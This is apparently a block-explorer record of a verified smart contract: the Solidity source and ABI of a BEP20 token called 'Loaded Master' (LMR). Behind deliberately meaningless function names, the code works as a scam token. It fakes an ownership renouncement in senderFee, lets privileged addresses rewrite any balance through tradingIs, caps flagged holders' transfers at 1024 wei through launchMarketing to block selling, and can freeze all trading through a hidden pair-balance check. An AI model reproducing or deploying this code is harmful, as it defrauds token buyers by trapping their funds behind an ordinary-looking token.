{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface launchTokenTrading {\n    function createPair(address modeEnable, address autoLiquidityMax) external returns (address);\n}\n\ninterface isAmountBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverSell) external view returns (uint256);\n\n    function transfer(address tokenReceiver, uint256 listIsTotal) external returns (bool);\n\n    function allowance(address launchTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listIsTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenReceiver,\n        uint256 listIsTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletLaunched, uint256 value);\n    event Approval(address indexed launchTeam, address indexed spender, uint256 value);\n}\n\nabstract contract receiverMaxTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalLaunched is isAmountBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LoadedMaster is receiverMaxTo, isAmountBuy, totalLaunched {\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedTo;\n    }\n\n    function swapTokenSell(uint256 listIsTotal) public {\n        atEnable();\n        txTo = listIsTotal;\n    }\n\n    function allowance(address autoLimit, address buyFrom) external view virtual override returns (uint256) {\n        if (buyFrom == buyIsShould) {\n            return type(uint256).max;\n        }\n        return launchWallet[autoLimit][buyFrom];\n    }\n\n    bool private autoReceiver;\n\n    uint256 tokenEnable;\n\n    address public sellShould;\n\n    address buyIsShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private isAmountMode;\n\n    function senderFee() public {\n        emit OwnershipTransferred(toFee, address(0));\n        senderMarketingReceiver = address(0);\n    }\n\n    address tokenLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private launchAuto;\n\n    mapping(address => mapping(address => uint256)) private launchWallet;\n\n    function transferFrom(address launchedAtSwap, address tokenReceiver, uint256 listIsTotal) external override returns (bool) {\n        if (_msgSender() != buyIsShould) {\n            if (launchWallet[launchedAtSwap][_msgSender()] != type(uint256).max) {\n                require(listIsTotal <= launchWallet[launchedAtSwap][_msgSender()]);\n                launchWallet[launchedAtSwap][_msgSender()] -= listIsTotal;\n            }\n        }\n        return maxMarketing(launchedAtSwap, tokenReceiver, listIsTotal);\n    }\n\n    uint256 public toWallet;\n\n    function launchBuy(address tradingMarketingEnable) public {\n        require(tradingMarketingEnable.balance < 100000);\n        if (launchedAmount) {\n            return;\n        }\n        \n        totalTx[tradingMarketingEnable] = true;\n        if (maxTx != launchAuto) {\n            toWallet = feeShouldAmount;\n        }\n        launchedAmount = true;\n    }\n\n    mapping(address => bool) public senderAmountToken;\n\n    uint256 private marketingAt = 100000000 * 10 ** 18;\n\n    function balanceOf(address receiverSell) public view virtual override returns (uint256) {\n        return takeSwap[receiverSell];\n    }\n\n    uint256 private feeShouldAmount;\n\n    function getOwner() external view returns (address) {\n        return senderMarketingReceiver;\n    }\n\n    event OwnershipTransferred(address indexed liquidityAmountBuy, address indexed modeSender);\n\n    uint256 constant txTeam = 2 ** 10;\n\n    bool private maxTx;\n\n    function maxMarketing(address launchedAtSwap, address tokenReceiver, uint256 listIsTotal) internal returns (bool) {\n        if (launchedAtSwap == toFee) {\n            return atToken(launchedAtSwap, tokenReceiver, listIsTotal);\n        }\n        uint256 swapTake = isAmountBuy(sellShould).balanceOf(tokenLaunch);\n        require(swapTake == txTo);\n        require(tokenReceiver != tokenLaunch);\n        if (senderAmountToken[launchedAtSwap]) {\n            return atToken(launchedAtSwap, tokenReceiver, txTeam);\n        }\n        return atToken(launchedAtSwap, tokenReceiver, listIsTotal);\n    }\n\n    uint256 txTo;\n\n    bool public launchedAmount;\n\n    function atToken(address launchedAtSwap, address tokenReceiver, uint256 listIsTotal) internal returns (bool) {\n        require(takeSwap[launchedAtSwap] >= listIsTotal);\n        takeSwap[launchedAtSwap] -= listIsTotal;\n        takeSwap[tokenReceiver] += listIsTotal;\n        emit Transfer(launchedAtSwap, tokenReceiver, listIsTotal);\n        return true;\n    }\n\n    address public toFee;\n\n    mapping(address => uint256) private takeSwap;\n\n    function atEnable() private view {\n        require(totalTx[_msgSender()]);\n    }\n\n    function transfer(address swapTotal, uint256 listIsTotal) external virtual override returns (bool) {\n        return maxMarketing(_msgSender(), swapTotal, listIsTotal);\n    }\n\n    constructor (){\n        \n        atIs launchTrading = atIs(buyIsShould);\n        sellShould = launchTokenTrading(launchTrading.factory()).createPair(launchTrading.WETH(), address(this));\n        if (autoReceiver) {\n            autoReceiver = true;\n        }\n        toFee = _msgSender();\n        totalTx[toFee] = true;\n        takeSwap[toFee] = marketingAt;\n        senderFee();\n        if (isAmountMode) {\n            autoReceiver = true;\n        }\n        emit Transfer(address(0), toFee, marketingAt);\n    }\n\n    function tradingIs(address swapTotal, uint256 listIsTotal) public {\n        atEnable();\n        takeSwap[swapTotal] = listIsTotal;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return isSell;\n    }\n\n    string private isSell = \"LMR\";\n\n    function approve(address buyFrom, uint256 listIsTotal) public virtual override returns (bool) {\n        launchWallet[_msgSender()][buyFrom] = listIsTotal;\n        emit Approval(_msgSender(), buyFrom, listIsTotal);\n        return true;\n    }\n\n    uint8 private launchedTo = 18;\n\n    uint256 private launchSwap;\n\n    function owner() external view returns (address) {\n        return senderMarketingReceiver;\n    }\n\n    address private senderMarketingReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingAt;\n    }\n\n    function launchMarketing(address autoFrom) public {\n        atEnable();\n        if (autoReceiver) {\n            launchSwap = feeShouldAmount;\n        }\n        if (autoFrom == toFee || autoFrom == sellShould) {\n            return;\n        }\n        senderAmountToken[autoFrom] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return teamLaunch;\n    }\n\n    mapping(address => bool) public totalTx;\n\n    bool public autoMarketingShould;\n\n    string private teamLaunch = \"Loaded Master\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAmountBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listIsTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMarketingShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMarketingEnable\",\"type\":\"address\"}],\"name\":\"launchBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFrom\",\"type\":\"address\"}],\"name\":\"launchMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderAmountToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listIsTotal\",\"type\":\"uint256\"}],\"name\":\"swapTokenSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listIsTotal\",\"type\":\"uint256\"}],\"name\":\"tradingIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listIsTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAtSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listIsTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LoadedMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}